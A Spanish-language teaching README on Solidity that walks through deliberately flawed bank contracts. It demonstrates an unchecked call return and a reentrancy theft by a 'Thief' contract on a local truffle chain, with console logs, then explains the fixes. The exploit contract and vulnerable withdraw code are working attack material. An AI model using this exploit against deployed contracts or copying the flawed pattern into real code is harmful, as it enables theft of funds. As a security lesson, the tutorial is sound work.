# Un ejemplo de contrato bancario con errores

## El contrato `BuggyBank`

El contrato `BuggyBank` modela un banco en el que es posible depositar, retirar y transferir fondos. Es similar al contrato `Bank` del ejemplo [Bank](../Bank/README.md), pero tiene algunos errores de programación que permiten que los clientes roben fondos del banco. Detallaremos las diferencias con el otro contrato.

### Versión del compilador

En este caso utilizamos una versión anterior del compilador, la 0.4.22. Usamos esta versión porque con el correr del tiempo se han agregado características que protegen contra algunos de los errores que mostraremos en este ejemplo (aunque no todos).

Aprovecharemos la oportunidad para mostrar algunas diferencias entre los distintos compiladores.

### Constructor

El constructor es similar al del contrato `Bank` del ejemplo [Bank](../Bank/README.md), con la diferencia que requiere el modificador `public`, que no es necesario en las versiones actuales. 


```solidity
    constructor() public {
        manager = msg.sender;
        emit ContractCreated(manager);
    }
```


### Retiro de fondos

En este contrato, la función `withdraw` tiene serios problemas.

```solidity
function withdraw(uint amount) public enoughFunds(amount) {
    accounts[msg.sender].balance -= amount;
    msg.sender.call.value(amount)("");
    emit Withdraw(msg.sender, amount);
}
```

Como podemos ver, no utiliza la función `transfer`, sino la función `call` del tipo `address`. La función `call` es una función miembro de `address` que permite invocar una función de un contrato. La función `call` recibe como argumento un `bytes` que representa la llamada a la función a invocar. En este caso le pasamos una cadana vacía, por lo cual no estamos invocando ninguna función específica. Lo que estamos haciendo es invocar la función `fallback` del contrato, que es una función especial que se invoca cuando no se especifica una función a invocar. La función `fallback` no recibe argumentos y no tiene valor de retorno. En este caso, la función `fallback` simplemente recibe los fondos transferidos.

Podemos ver que el valor de la transferencia se expresa con la notación `call.value(amount)("")`. En esto también difiere del mecanismo actual, en el cual se utiliza la notación `call{value: amount}("")`.

La función `call` devuelve un valor booleano que indica si la invocación fue exitosa o no, y un valor de tipo `bytes` con los datos devueltos por la función invocada. En este caso, no verificamos el valor de retorno de la función `call`, por lo cual no podemos saber si la invocación fue exitosa o no. Esto es un error de programación, ya que si la invocación falla, el cliente perderá los fondos que transfirió al contrato.

El otro problema vinculado con el uso de `call` es que no sabemos si el destinatario de los fondos es una cuenta externa o un contrato. En el caso de que se trate de un contrato, la invocación de la función `fallback` puede fallar, y el cliente perderá los fondos que transfirió al contrato. Por otro lado, tampoco sabemos si la función `fallback` del contrato destinatario tiene algún efecto secundario que pueda afectar al contrato `BuggyBank`.

Una versión más segura de la función `withdraw` sería la siguiente:

```solidity
function withdraw(uint amount) public enoughFunds(amount) {
    accounts[msg.sender].balance -= amount;
    (bool ok,) = msg.sender.call.value(amount)("");
    require(ok, "Transfer failed.");
    emit Withdraw(msg.sender, amount);
}
```

En este caso, verificamos el valor de retorno de la función `call`, y en caso de que la invocación falle, lanzamos una excepción con la función `require`. De esta forma, el cliente no perderá los fondos que transfirió al contrato.

Sin embargo, seguimos teniendo el problema de los potenciales efectos secundarios de la función `fallback` del contrato de destino. Para resolver este problema, podemos utilizar la función `transfer`, que es una función miembro de `address` que permite transferir fondos a una cuenta externa o a un contrato. La función `transfer` es similar a la función `call`, pero no devuelve ningún valor, y en caso de que la invocación falle, lanza una excepción. Además, a diferencia de `call`, la función `transfer` limita la cantidad de gas que se puede gastar en la invocación de la función `fallback` del contrato de destino. Esto evita que el contrato de destino pueda ejecutar código arbitrario en el contexto del contrato `BuggyBank`.

La función `send` también es una función miembro de `address` que permite transferir fondos a una cuenta externa o a un contrato. La función `send` es similar a la función `transfer`, pero no lanza una excepción en caso de que la invocación falle. En cambio, devuelve un valor booleano que indica si la invocación fue exitosa o no.

### Terminación del contrato

La función `kill` permite terminar el contrato. Tiene el modificador `onlyManager`, que indica que la función solo puede ser invocada por el administrador del contrato. 

```solidity
function kill() public onlyManager {
    emit ContractTerminated(manager, address(this).balance);
    selfdestruct(payable(manager));
}
```

La función emite el evento `ContractTerminated` y luego invoca la función `selfdestruct`, que transfiere todos los fondos del contrato a la dirección especificada como argumento (en este caso el administrador), y finaliza el contrato.

**`selfdestruct` ha sido declarada obsoleta (*deprecated*)** y su uso no es recomendable. Está como demostración de un tipo de función que solo puede ser invocada por el administrador del contrato.

## Interacción con el contrato `BuggyBank`

Veamos un ejemplo de interacción con el contrato `BuggyBank` desde la consola creada al invocar `truffle develop`.

```javascript
truffle(develop)> var bank = await BuggyBank.new()
undefined
```

Depositamos 100.000 wei desde accounts[0]:

```javascript
truffle(develop)> bank.deposit({value: 100000})
{
  tx: '0x9251f8ad1c1dbdcb8876612d23c4abf235ab645be645db09b4fef7e0b768135c',
  receipt: {
    transactionHash: '0x9251f8ad1c1dbdcb8876612d23c4abf235ab645be645db09b4fef7e0b768135c',
    transactionIndex: 0,
    blockNumber: 3,
    blockHash: '0x08b0daf1d6adaed6e90e74686673738e303e3d2e08f40ecc886f40c5ff40cf83',
    from: '0x709642f3ecbca11258abde0de9b0d7a716c56ca5',
    to: '0x7f1b2fd07205548bc64c76e777bce17d860c7615',
    cumulativeGasUsed: 66997,
    gasUsed: 66997,
    contractAddress: null,
    logs: [ [Object] ],
    logsBloom: '0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000
    0000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000
    000000000000000000000000000000000000020000000000400000000000000000',
    status: true,
    effectiveGasPrice: 3205266271,
    type: '0x2',
    rawLogs: [ [Object] ]
  },
  logs: [
    {
      address: '0x7f1b2Fd07205548Bc64c76e777Bce17D860c7615',
      blockHash: '0x08b0daf1d6adaed6e90e74686673738e303e3d2e08f40ecc886f40c5ff40cf83',
      blockNumber: 3,
      logIndex: 0,
      removed: false,
      transactionHash: '0x9251f8ad1c1dbdcb8876612d23c4abf235ab645be645db09b4fef7e0b768135c',
      transactionIndex: 0,
      id: 'log_722c7e0f',
      event: 'Deposit',
      args: [Result]
    }
  ]
}
```

Vemos que el balance de `bank` es 100.000 wei:

```javascript
truffle(develop)> web3.eth.getBalance(bank.address)
'100000'
```

Vemos que para `bank`, el balance de `accounts[0]` es 100.000 wei:

```javascript
truffle(develop)> var b = await bank.balance(accounts[0])
undefined
truffle(develop)> b.toNumber()
100000
```

Retiramos 40.000 wei desde `accounts[0]`:

```javascript
truffle(develop)> bank.withdraw(40000)
{
  tx: '0xc19eda37c657a149024d4409919c283fe0021b2b6b69397feff8252373fece05',
  receipt: {
    transactionHash: '0xc19eda37c657a149024d4409919c283fe0021b2b6b69397feff8252373fece05',
    transactionIndex: 0,
    blockNumber: 4,
    blockHash: '0x39af4adfcc581de5bba64a2ac340d8c8cefcc2b6d5944b5d995a71b58c396d25',
    from: '0x709642f3ecbca11258abde0de9b0d7a716c56ca5',
    to: '0x7f1b2fd07205548bc64c76e777bce17d860c7615',
    cumulativeGasUsed: 35068,
    gasUsed: 35068,
    contractAddress: null,
    logs: [ [Object] ],
    logsBloom: '0x000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000400000
    00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000400100000000000000000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000
    00000000000000000000000000000000020000000000000000000000000000',
    status: true,
    effectiveGasPrice: 3118865311,
    type: '0x2',
    rawLogs: [ [Object] ]
  },
  logs: [
    {
      address: '0x7f1b2Fd07205548Bc64c76e777Bce17D860c7615',
      blockHash: '0x39af4adfcc581de5bba64a2ac340d8c8cefcc2b6d5944b5d995a71b58c396d25',
      blockNumber: 4,
      logIndex: 0,
      removed: false,
      transactionHash: '0xc19eda37c657a149024d4409919c283fe0021b2b6b69397feff8252373fece05',
      transactionIndex: 0,
      id: 'log_e6b83a56',
      event: 'Withdraw',
      args: [Result]
    }
  ]
}
```

Vemos que el balance de `accounts[0]` es 60.000 wei:

```javascript
truffle(develop)> bank.balance(accounts[0])
BN {
  negative: 0,
  words: [ 60000, <1 empty item> ],
  length: 1,
  red: null
}
```

El código no produce problemas cuando interactúa con una cuenta externa. Sin embargo, veamos que ocurre cuando interactúa con otro contrato.

Para ello utilizaremos una versión modificada del contrato `Client`, en el cual el método `fallback` falla si el monto a retirar no es mayor que 1.000 wei:

```javascript
function() external payable {
    emit ClientTransferReceived(msg.sender, msg.value);
    require(msg.value > 1000, "amount is too low");
}
```

Vemos aquí otra diferencia de entre versiones de Solidity. En esta versión, no se define una función `receive`, sino que se define una función `payable` sin nombre. Esta función es la que se ejecuta cuando se realiza una transferencia de fondos a un contrato.

Probemos la interacción entre `bank` y `client`:


```javascript
truffle(develop)> var client = await Client.new()
truffle(develop)> client.deposit(bank.address, {value: 100000})
{
  tx: '0x7425c9bbcd5f74a6519488d02af4cf5cdada5dd7caaa5a4b8cbcc7c738b25f8d',
  receipt: {
    transactionHash: '0x7425c9bbcd5f74a6519488d02af4cf5cdada5dd7caaa5a4b8cbcc7c738b25f8d',
    transactionIndex: 0,
    blockNumber: 5,
    blockHash: '0x5fc73e705e17f34dddbb9936e18952c05d3411b610817fc36bdc8150070debef',
    from: '0x709642f3ecbca11258abde0de9b0d7a716c56ca5',
    to: '0x4e34686ea61c3463215030e91bb7b27cf5d8b7f4',
    cumulativeGasUsed: 78513,
    gasUsed: 78513,
    contractAddress: null,
    logs: [ [Object] ],
    logsBloom: '0x000000000000000000000000008000000000000000000000000000000000000000000000000000000000000400000000400000
    00000400000000000000000000010000000000000000800000000000000000000000000000000000008000000000000000000000000000000000
    00000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000
    00000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000
    00000000000000000000000000000000020000000000400000000000000000',
    status: true,
    effectiveGasPrice: 3042314290,
    type: '0x2',
    rawLogs: [ [Object], [Object] ]
  },
  logs: [
    {
      address: '0x4E34686Ea61C3463215030E91Bb7B27cF5D8b7f4',
      blockHash: '0x5fc73e705e17f34dddbb9936e18952c05d3411b610817fc36bdc8150070debef',
      blockNumber: 5,
      logIndex: 1,
      removed: false,
      transactionHash: '0x7425c9bbcd5f74a6519488d02af4cf5cdada5dd7caaa5a4b8cbcc7c738b25f8d',
      transactionIndex: 0,
      id: 'log_d911e6cd',
      event: 'ClientDeposit',
      args: [Result]
    }
  ]
}
```

El depósito se realiza correctamente. Ahora intentemos retirar fondos:

```javascript
truffle(develop)> client.withdraw(bank.address, 10000)
{
  tx: '0xf5b817df56f2e23abcf21f23a44ab134fefe33124103b7a5492f9d48cb47716c',
  receipt: {
    transactionHash: '0xf5b817df56f2e23abcf21f23a44ab134fefe33124103b7a5492f9d48cb47716c',
    transactionIndex: 0,
    blockNumber: 6,
    blockHash: '0x90af34d36c28f96e4a5047d3514fb79c549d47952ff3ee4a2888e4bb582cb430',
    from: '0x709642f3ecbca11258abde0de9b0d7a716c56ca5',
    to: '0x4e34686ea61c3463215030e91bb7b27cf5d8b7f4',
    cumulativeGasUsed: 43572,
    gasUsed: 43572,
    contractAddress: null,
    logs: [ [Object], [Object] ],
    logsBloom: '0x000000000000000000000000008000000000000000000000001000000000000000000000008000000000000400000000400000
    00000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000004008000400100000000000000000000000000020000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000
    00001000000000000000000000000000020000000002000000000000000000',
    status: true,
    effectiveGasPrice: 2976108569,
    type: '0x2',
    rawLogs: [ [Object], [Object], [Object] ]
  },
  logs: [
    {
      address: '0x4E34686Ea61C3463215030E91Bb7B27cF5D8b7f4',
      blockHash: '0x90af34d36c28f96e4a5047d3514fb79c549d47952ff3ee4a2888e4bb582cb430',
      blockNumber: 6,
      logIndex: 0,
      removed: false,
      transactionHash: '0xf5b817df56f2e23abcf21f23a44ab134fefe33124103b7a5492f9d48cb47716c',
      transactionIndex: 0,
      id: 'log_4bf49b95',
      event: 'ClientTransferReceived',
      args: [Result]
    },
    {
      address: '0x4E34686Ea61C3463215030E91Bb7B27cF5D8b7f4',
      blockHash: '0x90af34d36c28f96e4a5047d3514fb79c549d47952ff3ee4a2888e4bb582cb430',
      blockNumber: 6,
      logIndex: 2,
      removed: false,
      transactionHash: '0xf5b817df56f2e23abcf21f23a44ab134fefe33124103b7a5492f9d48cb47716c',
      transactionIndex: 0,
      id: 'log_e2b2c6ed',
      event: 'ClientWithdraw',
      args: [Result]
    }
  ]
}
truffle(develop)> bank.balance(client.address)
BN {
  negative: 0,
  words: [ 90000, <1 empty item> ],
  length: 1,
  red: null
}
truffle(develop)> web3.eth.getBalance(client.address)
'10000'
```

Ahora probemos retirar 1.000 wei:

```javascript
truffle(develop)> client.withdraw(bank.address, 1000)
{
  tx: '0x2ee8c7ac47135aa5114cc585429be7d89be9c1fff46fedddffc45562d8953e6f',
  receipt: {
    transactionHash: '0x2ee8c7ac47135aa5114cc585429be7d89be9c1fff46fedddffc45562d8953e6f',
    transactionIndex: 0,
    blockNumber: 7,
    blockHash: '0xfb94c80a4f0111bdafb3fa903416197e1c4283ecbe23af9c9a203bc75866de57',
    from: '0x709642f3ecbca11258abde0de9b0d7a716c56ca5',
    to: '0x4e34686ea61c3463215030e91bb7b27cf5d8b7f4',
    cumulativeGasUsed: 43779,
    gasUsed: 43779,
    contractAddress: null,
    logs: [ [Object] ],
    logsBloom: '0x000000000000000000000000008000000000000000000000001000000000000000000000000000000000000400000000400000
    00000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000004008000400100000000000000000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000
    00000000000000000000000000000000020000000002000000000000000000',
    status: true,
    effectiveGasPrice: 2917366535,
    type: '0x2',
    rawLogs: [ [Object], [Object] ]
  },
  logs: [
    {
      address: '0x4E34686Ea61C3463215030E91Bb7B27cF5D8b7f4',
      blockHash: '0xfb94c80a4f0111bdafb3fa903416197e1c4283ecbe23af9c9a203bc75866de57',
      blockNumber: 7,
      logIndex: 1,
      removed: false,
      transactionHash: '0x2ee8c7ac47135aa5114cc585429be7d89be9c1fff46fedddffc45562d8953e6f',
      transactionIndex: 0,
      id: 'log_b545dcb8',
      event: 'ClientWithdraw',
      args: [Result]
    }
  ]
}
```

Parece que todo funciona bien. Veamos el saldo del cliente:

```javascript
truffle(develop)> web3.eth.getBalance(client.address)
'10000'
truffle(develop)> bank.balance(client.address)
BN {
  negative: 0,
  words: [ 89000, <1 empty item> ],
  length: 1,
  red: null
}
```

¡Ups!. El saldo del cliente no ha cambiado, pero el saldo de la cuenta bancaria ha disminuido en 1.000 wei. 

Esto se debe a que la función `fallback` falló, pero como no verificamos el valor de retorno de `call`, no se lanzó ninguna excepción. Por lo tanto el banco no se enteró de que la transacción falló y descontó el dinero de la cuenta del cliente, por más que la transferencia no se realizó.

## Un error más grave: el contrato `VeryBuggyBank`

Veamos ahora un contrato que tiene un error más grave. Este contrato es  `VeryBuggyBank`:

```solidity
import "./BuggyBank.sol";

contract VeryBuggyBank is BuggyBank{

    function withdraw(uint amount) public enoughFunds(amount) {
        msg.sender.call.value(amount)("");
        accounts[msg.sender].balance -= amount;
        emit Withdraw(msg.sender, amount);
    }
}
```

Este contrato hereda de `BuggyBank` y redefine la función `withdraw`. El código es similar, salvo que en este caso se decrementa el balance *después* de llamar a `call.value(amount)("")`. 
Esto implica que si la función `fallback` del contrato de destino vuelve a llamar a `withdraw`, fallará el control de seguridad `enoughFunds(amount)`, ya que el balance todavía no fue actualizado.

Para explotar este problema utilizaremos el contrato `Thief`. Este contrato es similar a `Client`, pero el comportamiento de la función `fallback` depende de una variable global `retry`:

```solidity
    function() external payable {
        emit ThiefTransferReceived(msg.sender, msg.value);
        if (retry > 0) {
            retry -= 1;
            BuggyBank(msg.sender).withdraw(msg.value);
        }
    }
```

Si `retry` es mayor que cero, el contrato `Thief` intentará retirar más dinero de la cuenta bancaria. Si `retry` es cero, el contrato `Thief` no hará nada.

El contrato `Thief` tiene un método `steal` que permite configurar el valor de `retry`:

```solidity
function steal(address addr, uint amount, uint times) public onlyThief {
    retry = times;
    BuggyBank(addr).withdraw(amount);
    emit ThiefSteal(addr,amount,times);
}
```

Veamos la interacción entre el contrato `Thief` y el contrato `VeryBuggyBank`:

```javascript
truffle(develop)> var bank = await VeryBuggyBank.new()
undefined
truffle(develop)> var thief = await Thief.new()
undefined
truffle(develop)> bank.deposit({value: 100000})
{
  tx: '0x2355dcd7f69b827ded6dbfa47a0c6faec398451dc54c4185e7e91d9816243107',
  receipt: {
    transactionHash: '0x2355dcd7f69b827ded6dbfa47a0c6faec398451dc54c4185e7e91d9816243107',
    transactionIndex: 0,
    blockNumber: 4,
    blockHash: '0x2b6956aa53b51b343b7f9da423d673217eabf90f0f8db0b4069f1ad9a4324863',
    from: '0x709642f3ecbca11258abde0de9b0d7a716c56ca5',
    to: '0x4e34686ea61c3463215030e91bb7b27cf5d8b7f4',
    cumulativeGasUsed: 66997,
    gasUsed: 66997,
    contractAddress: null,
    logs: [ [Object] ],
    logsBloom: '0x0000000000000000000000000080000000000000000000000000000000000000000000000000000000000004000000000000000
    000000000000000000000000001000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000
    000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000400000000000000000',
    status: true,
    effectiveGasPrice: 3137352860,
    type: '0x2',
    rawLogs: [ [Object] ]
  },
  logs: [
    {
      address: '0x4E34686Ea61C3463215030E91Bb7B27cF5D8b7f4',
      blockHash: '0x2b6956aa53b51b343b7f9da423d673217eabf90f0f8db0b4069f1ad9a4324863',
      blockNumber: 4,
      logIndex: 0,
      removed: false,
      transactionHash: '0x2355dcd7f69b827ded6dbfa47a0c6faec398451dc54c4185e7e91d9816243107',
      transactionIndex: 0,
      id: 'log_a70a62dc',
      event: 'Deposit',
      args: [Result]
    }
  ]
}
truffle(develop)> bank.balance(accounts[0])
BN {
  negative: 0,
  words: [ 100000, <1 empty item> ],
  length: 1,
  red: null
}
truffle(develop)> thief.deposit(bank.address, {value: 50000})
{
  tx: '0xb4c5531c1c300c9d29189ff67302e2e91d62dd8e36f978f0b67dfaed0cee37b6',
  receipt: {
    transactionHash: '0xb4c5531c1c300c9d29189ff67302e2e91d62dd8e36f978f0b67dfaed0cee37b6',
    transactionIndex: 0,
    blockNumber: 5,
    blockHash: '0xb052dca919cbb5953d6f7b3aee52f6d798d1aec7463c4c3fe92b7c4dcf080b9b',
    from: '0x709642f3ecbca11258abde0de9b0d7a716c56ca5',
    to: '0x04590dd27b025d164040c910ef38bc70be59799f',
    cumulativeGasUsed: 78535,
    gasUsed: 78535,
    contractAddress: null,
    logs: [ [Object] ],
    logsBloom: '0x000000000000000000000000008000000000000000000000000000000000000000000000000000000000000400000000000000
    00000000000400000000000000010000000000000000000000000000800000200000000008000000008000000000000000000000000000000000
    00000000080000000000000000000000008000000000000000000000000000000000000000000100000000000000000000000000000000000000
    00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000000000400000000000000000',
    status: true,
    effectiveGasPrice: 3059271855,
    type: '0x2',
    rawLogs: [ [Object], [Object] ]
  },
  logs: [
    {
      address: '0x04590DD27b025D164040C910eF38bc70be59799f',
      blockHash: '0xb052dca919cbb5953d6f7b3aee52f6d798d1aec7463c4c3fe92b7c4dcf080b9b',
      blockNumber: 5,
      logIndex: 1,
      removed: false,
      transactionHash: '0xb4c5531c1c300c9d29189ff67302e2e91d62dd8e36f978f0b67dfaed0cee37b6',
      transactionIndex: 0,
      id: 'log_40c97ddc',
      event: 'ThiefDeposit',
      args: [Result]
    }
  ]
}
truffle(develop)> bank.balance(thief.address)
BN {
  negative: 0,
  words: [ 50000, <1 empty item> ],
  length: 1,
  red: null
}
```

Hasta ahora, todo parece normal. Depositamos 100.000 wei desde `accounts[0]` y 50.000 wei desde `thief`. El balance del banco es correcto:
  
  ```javascript
truffle(develop)> web3.eth.getBalance(bank.address)
'150000'
```

Intentemos un retiro:
  
  ```javascript
truffle(develop)> thief.withdraw(bank.address, 10000)
{
  tx: '0x7c8c53de9e15de3d4cadd1ced20452a6afdbf3536f3fc82eed2aba4a9776d75a',
  receipt: {
    transactionHash: '0x7c8c53de9e15de3d4cadd1ced20452a6afdbf3536f3fc82eed2aba4a9776d75a',
    transactionIndex: 0,
    blockNumber: 6,
    blockHash: '0xadd7e5c66994ec67a5a5e8a768514739369e553e5630e80b3db06b822070ba46',
    from: '0x709642f3ecbca11258abde0de9b0d7a716c56ca5',
    to: '0x04590dd27b025d164040c910ef38bc70be59799f',
    cumulativeGasUsed: 45698,
    gasUsed: 45698,
    contractAddress: null,
    logs: [ [Object], [Object] ],
    logsBloom: '0x00000000000000000000000000800000000000000000000000100000000000000000000000000000400000040000000000000
    0000000000000000000000000000100000000000000000000000000000000002000000000080000000000000000000000000000000000000000
    0000000000000000000000000000000000008400100000008000000000000000000000000000000000000000000010000000000000000000000
    0000000000000000000000020000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000
    000000000000000000000010000000000000000000000000000000000000000000',
    status: true,
    effectiveGasPrice: 2990996412,
    type: '0x2',
    rawLogs: [ [Object], [Object], [Object] ]
  },
  logs: [
    {
      address: '0x04590DD27b025D164040C910eF38bc70be59799f',
      blockHash: '0xadd7e5c66994ec67a5a5e8a768514739369e553e5630e80b3db06b822070ba46',
      blockNumber: 6,
      logIndex: 0,
      removed: false,
      transactionHash: '0x7c8c53de9e15de3d4cadd1ced20452a6afdbf3536f3fc82eed2aba4a9776d75a',
      transactionIndex: 0,
      id: 'log_25192af3',
      event: 'ThiefTransferReceived',
      args: [Result]
    },
    {
      address: '0x04590DD27b025D164040C910eF38bc70be59799f',
      blockHash: '0xadd7e5c66994ec67a5a5e8a768514739369e553e5630e80b3db06b822070ba46',
      blockNumber: 6,
      logIndex: 2,
      removed: false,
      transactionHash: '0x7c8c53de9e15de3d4cadd1ced20452a6afdbf3536f3fc82eed2aba4a9776d75a',
      transactionIndex: 0,
      id: 'log_c2d2f406',
      event: 'ThiefWithdraw',
      args: [Result]
    }
  ]
}
truffle(develop)> bank.balance(thief.address)
BN {
  negative: 0,
  words: [ 40000, <1 empty item> ],
  length: 1,
  red: null
}
truffle(develop)> web3.eth.getBalance(thief.address)
'10000'
```

Nuevamente, el resultado parece ser correcto. Retiramos 10.000 wei desde `thief` y el balance del banco es correcto, así como el balance de `thief`.
  
Ahora tratemos de usar la función `steal`:
  
```javascript  
truffle(develop)> thief.steal(bank.address, 30000, 3)
{
  tx: '0xd408aea55426ac5f43ffd22185f19929565f99e7fcef3341893d8784a4e78ccd',
  receipt: {
    transactionHash: '0xd408aea55426ac5f43ffd22185f19929565f99e7fcef3341893d8784a4e78ccd',
    transactionIndex: 0,
    blockNumber: 7,
    blockHash: '0x300fd72f970860cf2295592eb8d74f1a0c0304a736c1130bc91144bcdf5e023d',
    from: '0x709642f3ecbca11258abde0de9b0d7a716c56ca5',
    to: '0x04590dd27b025d164040c910ef38bc70be59799f',
    cumulativeGasUsed: 79792,
    gasUsed: 79792,
    contractAddress: null,
    logs: [ [Object], [Object], [Object], [Object], [Object] ],
    logsBloom: '0x000000000000000000000000008000000000000000000000001000000000000000000000000000004000000400000000000000000
    00000001000000000000000010000000000000000000000000000000000200000000008000000000000000000000000000000000000000000000000
    00000000000000000000000000008400100000000000000000000000000000000000000000000000000010000000000000000000000000000000000
    00000000000000040000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000
    00000010000000000000000000000000000000000000000000',
    status: true,
    effectiveGasPrice: 2930456346,
    type: '0x2',
    rawLogs: [
      [Object], [Object],
      [Object], [Object],
      [Object], [Object],
      [Object], [Object],
      [Object]
    ]
  },
  logs: [
    {
      address: '0x04590DD27b025D164040C910eF38bc70be59799f',
      blockHash: '0x300fd72f970860cf2295592eb8d74f1a0c0304a736c1130bc91144bcdf5e023d',
      blockNumber: 7,
      logIndex: 0,
      removed: false,
      transactionHash: '0xd408aea55426ac5f43ffd22185f19929565f99e7fcef3341893d8784a4e78ccd',
      transactionIndex: 0,
      id: 'log_4ee08487',
      event: 'ThiefTransferReceived',
      args: [Result]
    },
    {
      address: '0x04590DD27b025D164040C910eF38bc70be59799f',
      blockHash: '0x300fd72f970860cf2295592eb8d74f1a0c0304a736c1130bc91144bcdf5e023d',
      blockNumber: 7,
      logIndex: 1,
      removed: false,
      transactionHash: '0xd408aea55426ac5f43ffd22185f19929565f99e7fcef3341893d8784a4e78ccd',
      transactionIndex: 0,
      id: 'log_1c8e4b7a',
      event: 'ThiefTransferReceived',
      args: [Result]
    },
    {
      address: '0x04590DD27b025D164040C910eF38bc70be59799f',
      blockHash: '0x300fd72f970860cf2295592eb8d74f1a0c0304a736c1130bc91144bcdf5e023d',
      blockNumber: 7,
      logIndex: 2,
      removed: false,
      transactionHash: '0xd408aea55426ac5f43ffd22185f19929565f99e7fcef3341893d8784a4e78ccd',
      transactionIndex: 0,
      id: 'log_bd2d27ab',
      event: 'ThiefTransferReceived',
      args: [Result]
    },
    {
      address: '0x04590DD27b025D164040C910eF38bc70be59799f',
      blockHash: '0x300fd72f970860cf2295592eb8d74f1a0c0304a736c1130bc91144bcdf5e023d',
      blockNumber: 7,
      logIndex: 3,
      removed: false,
      transactionHash: '0xd408aea55426ac5f43ffd22185f19929565f99e7fcef3341893d8784a4e78ccd',
      transactionIndex: 0,
      id: 'log_f0f7fd1e',
      event: 'ThiefTransferReceived',
      args: [Result]
    },
    {
      address: '0x04590DD27b025D164040C910eF38bc70be59799f',
      blockHash: '0x300fd72f970860cf2295592eb8d74f1a0c0304a736c1130bc91144bcdf5e023d',
      blockNumber: 7,
      logIndex: 8,
      removed: false,
      transactionHash: '0xd408aea55426ac5f43ffd22185f19929565f99e7fcef3341893d8784a4e78ccd',
      transactionIndex: 0,
      id: 'log_54569cd9',
      event: 'ThiefSteal',
      args: [Result]
    }
  ]
}
```

Como podemos ver, la función `steal` ejecuta la función `withdraw` del contrato `VeryBuggyBank` 3 veces, y cada vez que se ejecuta la función `withdraw` se emite un evento `ThiefTransferReceived`. 

Veamos si el robo funcionó:

```javascript
truffle(develop)> web3.eth.getBalance(thief.address)
'130000'
truffle(develop)> web3.eth.getBalance(bank.address)
'20000'
```

Efectivamente, el contrato `Thief` robó 120.000 wei del contrato `VeryBuggyBank`, mucho más de lo que contenía su cuenta. Veamos cuanto contiene la cuenta ahora:
  
```javascript
truffle(develop)> (await bank.balance(thief.address)).toString()
'115792089237316195423570985008687907853269984665640564039457584007913129559936'
```

Como podemos ver, el contrato `Thief` robó todo el dinero del contrato `VeryBuggyBank`, y ahora tiene un balance que es casi el máximo valor que puede tener un número en Solidity. Lo que ocurre es que como quedamos con saldo negativo, y el saldo es de tipo `uint`, el resultado desborda. Como el saldo de la cuenta era 40.000, y retiramos 120.000, el saldo debería ser -80.000, pero como el tipo de dato es `uint`, 
el resultado es 

2<sup>256</sup>-80.000=115.792.089.237.316.195.423.570.985.008.687.907.853.269.984.665.640.564.039.457.584.007.913.129.559.936

Este *bug* es el resultado de varios problemas.

Por un lado, al igual que en el ejemplo con `BuggyBank`, no verificamos el valor de retorno de la llamada a `call`. Por otro, decrementamos el balance **después** de hacer la transferencia, lo cual permite que el contrato destinatario viole los controles volviendo a llamar a `withdraw`. Y otro problema es el comportamiento de Solidity al desbordar un `uint`.

Este último problema se soluciona en versiones más nuevas del compilador, que lanzan una excepción cuando se produce un desbordamiento. En la versión 0.4.22, que es la que usamos en este ejemplo, no se lanza una excepción, y el resultado es el que hemos visto.

Por otra parte, estamos permitiendo que el contrato de destino ejecute demasiadas cosas. Una forma de limitar eso es reducir la cantidad de gas disponible para la ejecución de la función de recepción. Por eso es mucho mejor utilizar la función `transfer` en lugar de `call`. La función `transfer`, además de fallar si la transacción falla, limita el gas disponible para la ejecución de la función de recepción a 2300 gas. Esto garantiza que la función de recepción pueda hacer muy poco, y por lo tanto evita que pueda volver a llamar a `withdraw`.